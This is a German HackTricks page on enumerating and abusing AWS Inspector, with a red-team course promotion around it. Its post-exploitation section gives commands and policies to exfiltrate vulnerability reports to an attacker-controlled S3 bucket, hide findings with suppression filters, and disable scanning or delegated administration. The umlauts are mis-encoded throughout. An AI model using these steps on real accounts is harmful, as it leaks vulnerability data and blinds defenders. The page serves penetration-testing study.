# AWS - Inspector Enum

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** m√∂chten oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Inspector

Amazon Inspector ist ein fortschrittlicher, automatisierter Schwachstellen-Management-Dienst, der entwickelt wurde, um die Sicherheit Ihrer AWS-Umgebung zu verbessern. Dieser Dienst scannt kontinuierlich Amazon EC2-Instanzen, Container-Images in Amazon ECR, Amazon ECS und AWS Lambda-Funktionen auf Schwachstellen und unbeabsichtigte Netzwerkexpositionen. Durch die Nutzung einer umfangreichen Schwachstellen-Intelligenzdatenbank bietet Amazon Inspector detaillierte Ergebnisse, einschlie√ülich Schweregraden und Empfehlungen zur Fehlerbehebung, um Organisationen dabei zu helfen, Sicherheitsrisiken proaktiv zu identifizieren und anzugehen. Dieser umfassende Ansatz gew√§hrleistet eine gest√§rkte Sicherheitsposition √ºber verschiedene AWS-Dienste hinweg und unterst√ºtzt die Einhaltung und Risikomanagement.

## Schl√ºsselelemente

### Ergebnisse

Ergebnisse in Amazon Inspector sind detaillierte Berichte √ºber Schwachstellen und Expositionen, die w√§hrend des Scans von EC2-Instanzen, ECR-Repositories oder Lambda-Funktionen entdeckt wurden. Basierend auf ihrem Zustand werden Ergebnisse kategorisiert als:

- **Aktiv**: Die Entdeckung wurde nicht behoben.
- **Geschlossen**: Die Entdeckung wurde behoben.
- **Unterdr√ºckt**: Die Entdeckung wurde aufgrund einer oder mehrerer **Unterdr√ºckungsregeln** mit diesem Status markiert.

Ergebnisse werden auch in die folgenden drei Typen kategorisiert:

- **Paket**: Diese Ergebnisse beziehen sich auf Schwachstellen in Softwarepaketen, die auf Ihren Ressourcen installiert sind. Beispiele sind veraltete Bibliotheken oder Abh√§ngigkeiten mit bekannten Sicherheitsproblemen.
- **Code**: Diese Kategorie umfasst Schwachstellen im Code von Anwendungen, die auf Ihren AWS-Ressourcen ausgef√ºhrt werden. H√§ufige Probleme sind Codierungsfehler oder unsichere Praktiken, die zu Sicherheitsverletzungen f√ºhren k√∂nnten.
- **Netzwerk**: Netzwerk-Ergebnisse identifizieren potenzielle Expositionen in Netzwerkkonfigurationen, die von Angreifern ausgenutzt werden k√∂nnten. Dazu geh√∂ren offene Ports, unsichere Netzwerkprotokolle und fehlerhaft konfigurierte Sicherheitsgruppen.

### Filter und Unterdr√ºckungsregeln

Filter und Unterdr√ºckungsregeln in Amazon Inspector helfen dabei, Ergebnisse zu verwalten und zu priorisieren. Filter erm√∂glichen es Ihnen, Ergebnisse basierend auf spezifischen Kriterien wie Schweregrad oder Ressourcentyp zu verfeinern. Unterdr√ºckungsregeln erm√∂glichen es Ihnen, bestimmte Ergebnisse zu unterdr√ºcken, die als geringes Risiko angesehen werden, bereits behoben wurden oder aus einem anderen wichtigen Grund, um zu verhindern, dass sie Ihre Sicherheitsberichte √ºberlasten, und es Ihnen erm√∂glichen, sich auf kritischere Probleme zu konzentrieren.

### Software-Bestandsliste (SBOM)

Eine Software-Bestandsliste (SBOM) in Amazon Inspector ist eine exportierbare verschachtelte Bestandsliste, die alle Komponenten innerhalb eines Softwarepakets, einschlie√ülich Bibliotheken und Abh√§ngigkeiten, detailliert auflistet. SBOMs helfen dabei, Transparenz in die Software-Lieferkette zu bringen, was eine bessere Schwachstellenverwaltung und Einhaltung erm√∂glicht. Sie sind entscheidend f√ºr die Identifizierung und Minderung von Risiken im Zusammenhang mit Open-Source- und Drittanbieter-Softwarekomponenten.

## Hauptfunktionen

### Export von Ergebnissen

Amazon Inspector bietet die M√∂glichkeit, Ergebnisse in Amazon S3-Buckets, Amazon EventBridge und AWS Security Hub zu exportieren, was es Ihnen erm√∂glicht, detaillierte Berichte √ºber identifizierte Schwachstellen und Expositionen f√ºr weitere Analysen oder zum Teilen zu einem bestimmten Datum und Zeitpunkt zu generieren. Diese Funktion unterst√ºtzt verschiedene Ausgabeformate wie CSV und JSON, was die Integration mit anderen Tools und Systemen erleichtert. Die Exportfunktionalit√§t erm√∂glicht die Anpassung der in den Berichten enthaltenen Daten, sodass Sie Ergebnisse basierend auf spezifischen Kriterien wie Schweregrad, Ressourcentyp oder Datumsbereich filtern und standardm√§√üig alle Ihre Ergebnisse im aktuellen AWS-Region mit einem aktiven Status einschlie√üen k√∂nnen.

Beim Exportieren von Ergebnissen ist ein Schl√ºsselverwaltungsdienst (KMS) erforderlich, um die Daten w√§hrend des Exports zu verschl√ºsseln. KMS-Schl√ºssel stellen sicher, dass die exportierten Ergebnisse vor unbefugtem Zugriff gesch√ºtzt sind und bieten eine zus√§tzliche Sicherheitsebene f√ºr sensible Schwachstelleninformationen.

### Scannen von Amazon EC2-Instanzen

Amazon Inspector bietet robuste Scannm√∂glichkeiten f√ºr Amazon EC2-Instanzen, um Schwachstellen und Sicherheitsprobleme zu erkennen. Inspector vergleicht extrahierte Metadaten von der EC2-Instanz mit Regeln aus Sicherheitswarnungen, um Paketschwachstellen und Netzwerkzugriffsprobleme zu identifizieren. Diese Scans k√∂nnen durch **agentenbasierte** oder **agentenlose** Methoden durchgef√ºhrt werden, abh√§ngig von der Konfiguration der **Scanmodus**-Einstellungen Ihres Kontos.

- **Agentenbasiert**: Nutzt den AWS Systems Manager (SSM)-Agenten f√ºr eingehende Scans. Diese Methode erm√∂glicht eine umfassende Datensammlung und -analyse direkt von der Instanz.
- **Agentenlos**: Bietet eine leichtgewichtige Alternative, die keine Installation eines Agenten auf der Instanz erfordert, indem ein EBS-Snapshot von jedem Volume der EC2-Instanz erstellt wird, nach Schwachstellen gesucht und dann gel√∂scht wird; Nutzung der vorhandenen AWS-Infrastruktur f√ºr das Scannen.

Der Scanmodus bestimmt, welche Methode f√ºr die Durchf√ºhrung von EC2-Scans verwendet wird:

- **Agentenbasiert**: Beinhaltet die Installation des SSM-Agenten auf EC2-Instanzen f√ºr eine gr√ºndliche Inspektion.
- **Hybrid-Scannen**: Kombiniert agentenbasierte und agentenlose Methoden, um die Abdeckung zu maximieren und die Leistungsauswirkungen zu minimieren. Bei den EC2-Instanzen, auf denen der SSM-Agent installiert ist, f√ºhrt Inspector einen agentenbasierten Scan durch, und bei denen, auf denen kein SSM-Agent vorhanden ist, wird ein agentenloser Scan durchgef√ºhrt.

Eine weitere wichtige Funktion ist die **gr√ºndliche Inspektion** f√ºr EC2-Linux-Instanzen. Diese Funktion bietet eine gr√ºndliche Analyse der Software und Konfiguration von EC2-Linux-Instanzen und bietet detaillierte Schwachstellenbewertungen, einschlie√ülich Betriebssystemschwachstellen, Anwendungsschwachstellen und Konfigurationsfehler, um eine umfassende Sicherheitsbewertung sicherzustellen. Dies wird durch die Inspektion von **benutzerdefinierten Pfaden** und all ihren Unterverzeichnissen erreicht. Standardm√§√üig wird Amazon Inspector die folgenden Pfade scannen, aber jedes Mitgliedskonto kann bis zu 5 weitere benutzerdefinierte Pfade definieren, und jeder delegierte Administrator bis zu 10:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Scannen von Amazon ECR-Container-Images

Amazon Inspector bietet robuste Scannm√∂glichkeiten f√ºr Amazon Elastic Container Registry (ECR)-Container-Images, um sicherzustellen, dass Paketschwachstellen effizient erkannt und verwaltet werden.

- **Grundlegendes Scannen**: Dies ist ein schneller und leichtgewichtiger Scan, der bekannte OS-Paketschwachstellen in Container-Images mithilfe eines Standardsets von Regeln aus dem Open-Source-Projekt Clair identifiziert. Mit dieser Scankonfiguration werden Ihre Repositorien beim Push oder bei manuellen Scans gescannt.
- **Erweitertes Scannen**: Diese Option f√ºgt dem Push-Scan die kontinuierliche Scannfunktion hinzu. Das erweiterte Scannen taucht tiefer in die Schichten jedes Container-Images ein, um Schwachstellen in OS-Paketen und Programmiersprachenpaketen mit h√∂herer Genauigkeit zu identifizieren. Es analysiert sowohl das Basisimage als auch alle zus√§tzlichen Schichten und bietet einen umfassenden √úberblick √ºber potenzielle Sicherheitsprobleme.

### Scannen von Amazon Lambda-Funktionen

Amazon Inspector bietet umfassende Scannm√∂glichkeiten f√ºr AWS Lambda-Funktionen und deren Schichten, um die Sicherheit und Integrit√§t serverloser Anwendungen zu gew√§hrleisten. Inspector bietet zwei Arten von Scans f√ºr Lambda-Funktionen:

- **Standard-Scannen von Lambda**: Diese Standardfunktion identifiziert Software-Schwachstellen in den Anwendungspaketabh√§ngigkeiten, die Ihrer Lambda-Funktion und Schichten hinzugef√ºgt wurden. Wenn Ihre Funktion beispielsweise eine Version einer Bibliothek wie python-jwt mit einer bekannten Schwachstelle verwendet, wird eine Entdeckung generiert.
- **Code-Scannen von Lambda**: Analysiert benutzerdefinierten Anwendungscode auf Sicherheitsprobleme und erkennt Schwachstellen wie Injektionsfehler, Datenlecks, schwache Kryptografie und fehlende Verschl√ºsselung. Es erfasst Codeausschnitte, die erkannte Schwachstellen hervorheben, wie z. B. hartcodierte Anmeldeinformationen. Die Ergebnisse enthalten detaillierte Empfehlungen zur Fehlerbehebung und Codeausschnitte zur Behebung der Probleme.
### **Center for Internet Security (CIS) Scans**

Amazon Inspector enth√§lt CIS-Scans, um die Betriebssysteme von Amazon EC2-Instanzen mit den Empfehlungen bew√§hrter Verfahren des Center for Internet Security (CIS) zu benchmarken. Diese Scans stellen sicher, dass Konfigurationen den Sicherheitsgrundlinien der Industriestandards entsprechen.

- **Konfiguration**: CIS-Scans bewerten, ob Systemkonfigurationen spezifische Empfehlungen des CIS-Benchmarks erf√ºllen, wobei jeder Check mit einer CIS-Check-ID und einem Titel verkn√ºpft ist.
- **Ausf√ºhrung**: Scans werden basierend auf Instanz-Tags und definierten Zeitpl√§nen durchgef√ºhrt oder geplant.
- **Ergebnisse**: Die Ergebnisse nach dem Scan zeigen an, welche Checks bestanden, √ºbersprungen oder fehlgeschlagen sind und geben Einblick in die Sicherheitslage jeder Instanz.

## Enumeration
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## Post-Exploitation

{% hint style="success" %}
Aus der Perspektive eines Angreifers kann dieser Dienst dem Angreifer helfen, Schwachstellen und Netzwerkexpositionen zu finden, die ihm helfen k√∂nnten, andere Instanzen/Container zu kompromittieren.

Ein Angreifer k√∂nnte jedoch auch daran interessiert sein, diesen Dienst zu st√∂ren, damit das Opfer Schwachstellen (alle oder bestimmte) nicht sehen kann.
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Ein Angreifer k√∂nnte detaillierte Berichte √ºber Schwachstellen oder Software-Bestandsaufnahmen (SBOMs) generieren und aus Ihrer AWS-Umgebung exfiltrieren. Diese Informationen k√∂nnten ausgenutzt werden, um spezifische Schw√§chen, veraltete Software oder unsichere Abh√§ngigkeiten zu identifizieren, die gezielte Angriffe erm√∂glichen.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
Das folgende Beispiel zeigt, wie alle aktiven Ergebnisse von Amazon Inspector in einen von einem Angreifer kontrollierten Amazon S3-Bucket mit einem von einem Angreifer kontrollierten Amazon KMS-Schl√ºssel exfiltriert werden k√∂nnen:

1. **Erstellen Sie einen Amazon S3-Bucket** und f√ºgen Sie eine Richtlinie hinzu, damit er vom Opfer-Amazon Inspector aus zug√§nglich ist:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Erstellen Sie einen Amazon KMS-Schl√ºssel** und f√ºgen Sie eine Richtlinie hinzu, damit er vom Amazon Inspector des Opfers verwendet werden kann:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. F√ºhren Sie den Befehl aus, um den Befundbericht zu **erstellen** und ihn zu exfiltrieren:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **Potenzielle Auswirkungen**: Generierung und Exfiltration von detaillierten Schwachstellen- und Softwareberichten, um Einblicke in spezifische Schwachstellen und Sicherheitsschw√§chen zu gewinnen.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Ein Angreifer k√∂nnte die Generierung des angegebenen Befundberichts oder SBOM-Berichts abbrechen, was verhindert, dass Sicherheitsteams rechtzeitig Informationen zu Schwachstellen und Software-Bestandsaufnahmen (SBOMs) erhalten, und die Erkennung und Behebung von Sicherheitsproblemen verz√∂gern.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **Potenzielle Auswirkungen**: St√∂rung der Sicherheits√ºberwachung und Verhinderung der rechtzeitigen Erkennung und Behebung von Sicherheitsproblemen.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Ein Angreifer mit diesen Berechtigungen k√∂nnte die Filterregeln manipulieren, die bestimmen, welche Schwachstellen und Sicherheitsprobleme gemeldet oder unterdr√ºckt werden (wenn die **Aktion** auf SUPPRESS gesetzt ist, w√ºrde eine Unterdr√ºckungsregel erstellt). Dies k√∂nnte kritische Schwachstellen vor Sicherheitsadministratoren verbergen und es einfacher machen, diese Schw√§chen ohne Entdeckung auszunutzen. Durch √Ñndern oder Entfernen wichtiger Filter k√∂nnte ein Angreifer auch L√§rm erzeugen, indem er das System mit irrelevanten Ergebnissen √ºberflutet, was eine effektive Sicherheits√ºberwachung und Reaktion behindert.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **Potenzielle Auswirkungen**: Verbergen oder Unterdr√ºcken von kritischen Schwachstellen oder √úberfluten des Systems mit irrelevanten Ergebnissen.

### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Ein Angreifer k√∂nnte die Sicherheitsmanagementstruktur erheblich st√∂ren.

- Durch Deaktivieren des delegierten Admin-Kontos k√∂nnte der Angreifer das Sicherheitsteam daran hindern, auf Amazon Inspector-Einstellungen und Berichte zuzugreifen und diese zu verwalten.
- Das Aktivieren eines nicht autorisierten Admin-Kontos w√ºrde es einem Angreifer erm√∂glichen, Sicherheitskonfigurationen zu kontrollieren, m√∂glicherweise Scans zu deaktivieren oder Einstellungen zu √§ndern, um b√∂sartige Aktivit√§ten zu verbergen.

{% hint style="warning" %}

Es ist erforderlich, dass das nicht autorisierte Konto in derselben Organisation wie das Opfer ist, um zum delegierten Administrator zu werden.

Damit das nicht autorisierte Konto zum delegierten Administrator wird, ist es auch erforderlich, dass nach Deaktivierung des legitimen delegierten Administrators und vor Aktivierung des nicht autorisierten Kontos als delegierter Administrator der legitime Administrator als delegierter Administrator von der Organisation abgemeldet wird. Dies kann mit dem folgenden Befehl durchgef√ºhrt werden (**`organizations:DeregisterDelegatedAdministrator`** Berechtigung erforderlich): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **Potenzielle Auswirkung**: St√∂rung des Sicherheitsmanagements.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Ein Angreifer k√∂nnte die Zuordnung von Mitgliedskonten innerhalb einer Amazon Inspector-Organisation manipulieren. Indem er nicht autorisierte Konten zuordnet oder legitime Konten trennt, k√∂nnte ein Angreifer kontrollieren, welche Konten in Sicherheitsscans und Berichten enthalten sind. Dies k√∂nnte dazu f√ºhren, dass wichtige Konten von der Sicherheits√ºberwachung ausgeschlossen werden, was es dem Angreifer erm√∂glicht, Schwachstellen in diesen Konten ohne Entdeckung auszunutzen.

{% hint style="warning" %}

Diese Aktion muss vom delegierten Administrator durchgef√ºhrt werden.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **Potenzielle Auswirkungen**: Ausschluss wichtiger Konten von Sicherheitspr√ºfungen, was eine unentdeckte Ausnutzung von Schwachstellen erm√∂glicht.

### `inspector2:Deaktivieren`, (`inspector2:Aktivieren` & `iam:CreateServiceLinkedRole`)

Ein Angreifer mit der Berechtigung `inspector2:Deaktivieren` k√∂nnte Sicherheitspr√ºfungen f√ºr bestimmte Ressourcentypen (EC2, ECR, Lambda, Lambda-Code) √ºber die angegebenen Konten deaktivieren, wodurch Teile der AWS-Umgebung nicht √ºberwacht und anf√§llig f√ºr Angriffe werden. Dar√ºber hinaus k√∂nnte ein Angreifer mit den Berechtigungen **`inspector2:Aktivieren`** & **`iam:CreateServiceLinkedRole`** dann selektiv Scans wieder aktivieren, um die Erkennung von verd√§chtigen Konfigurationen zu vermeiden.

{% hint style="warning" %}
Diese Aktion muss vom delegierten Administrator durchgef√ºhrt werden.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **Potenzielle Auswirkungen**: Schaffung von blinden Flecken in der Sicherheits√ºberwachung.

### `inspector2:UpdateOrganizationConfiguration`

Ein Angreifer mit dieser Berechtigung k√∂nnte die Konfigurationen f√ºr Ihre Amazon Inspector-Organisation aktualisieren und somit die standardm√§√üig aktivierten Scan-Funktionen f√ºr neue Mitgliedskonten beeinflussen.

{% hint style="warning" %}

Diese Aktion muss vom delegierten Administrator durchgef√ºhrt werden.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **Potenzielle Auswirkungen**: Sicherheits-Scan-Richtlinien und Konfigurationen f√ºr die Organisation √§ndern.

### `inspector2:TagResource`, `inspector2:UntagResource`

Ein Angreifer k√∂nnte Tags auf AWS Inspector-Ressourcen manipulieren, die entscheidend f√ºr die Organisation, Verfolgung und Automatisierung von Sicherheitsbewertungen sind. Durch √Ñndern oder Entfernen von Tags k√∂nnte ein Angreifer potenziell Sicherheitsl√ºcken vor Sicherheitsscans verbergen, die Compliance-Berichterstattung st√∂ren und automatisierte Behebungsprozesse beeintr√§chtigen, was zu nicht √ºberpr√ºften Sicherheitsproblemen und beeintr√§chtigter Systemintegrit√§t f√ºhren k√∂nnte.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **Potenzielle Auswirkungen**: Verbergen von Schwachstellen, St√∂rung der Compliance-Berichterstattung, St√∂rung der Sicherheitsautomatisierung und St√∂rung der Kostenzuweisung.

# Referenzen
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
